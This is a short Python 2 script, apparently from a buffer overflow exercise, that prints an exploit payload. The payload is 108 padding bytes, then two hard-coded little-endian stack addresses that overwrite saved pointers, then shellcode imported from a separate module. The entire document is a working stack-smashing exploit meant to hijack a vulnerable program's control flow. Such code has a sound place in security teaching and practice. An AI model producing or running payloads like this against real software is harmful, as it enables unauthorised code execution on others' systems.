from shellcode import shellcode
from struct import pack
print '\x61'*108+pack("<I", 0xbffedf88)+ pack("<I", 0xbffedf70) + shellcode
